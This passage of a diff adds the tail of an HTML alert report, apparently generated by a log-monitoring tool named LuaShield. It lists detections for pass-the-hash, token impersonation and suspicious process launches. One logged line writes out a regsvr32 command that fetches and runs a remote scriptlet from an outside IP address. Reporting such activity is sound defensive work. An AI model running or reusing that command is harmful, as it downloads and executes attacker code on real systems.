+            <td class="mono small truncate" title="[2024-03-16 02:44:00] INFO auth pass-the-hash attack detected targeting DOMAIN\svcaccount">[2024-03-16 02:44:00] INFO auth pass-the-hash attack detected targeting DOMAIN\svcaccount</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-16 02:44:05</td>
+            <td><span class="badge" style="color:#ff3b3b;background:#2a0a0a;border:1px solid #ff3b3b">CRITICAL</span></td>
+            <td><strong>Privilege Escalation</strong><br><span class="muted small">AUTH-001 — Attempt to gain elevated privileges.</span></td>
+            <td><span class="pill">AUTH</span></td>
+            <td class="mono small truncate" title="[2024-03-16 02:44:05] CRITICAL auth Token impersonation detected on WIN-DC01">[2024-03-16 02:44:05] CRITICAL auth Token impersonation detected on WIN-DC01</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-16 03:00:00</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Suspicious Process Execution</strong><br><span class="muted small">MAL-003 — Unusual process -- possible living-off-the-land attack.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-16 03:00:00] INFO edr mshta.exe spawned by winword.exe on LAPTOP-SALES3 (suspicious)">[2024-03-16 03:00:00] INFO edr mshta.exe spawned by winword.exe on LAPTOP-SALES3 (suspicious)</td>
+        </tr>
+        <tr>
+            <td class="mono small">2024-03-16 03:00:10</td>
+            <td><span class="badge" style="color:#ff8c00;background:#2a1800;border:1px solid #ff8c00">HIGH</span></td>
+            <td><strong>Suspicious Process Execution</strong><br><span class="muted small">MAL-003 — Unusual process -- possible living-off-the-land attack.</span></td>
+            <td><span class="pill">MAL</span></td>
+            <td class="mono small truncate" title="[2024-03-16 03:00:10] INFO edr regsvr32 /s /u /i:http://185.220.101.9/payload.sct scrobj.dll">[2024-03-16 03:00:10] INFO edr regsvr32 /s /u /i:http://185.220.101.9/payload.sct scrobj.dll</td>
+        </tr></tbody>
+    </table>
+    </div>
+
+</main>
+
+<footer>
+  LuaShield v1.0 — generated 2026-04-15 19:59:36
+</footer>
+
+</body>
+</html>
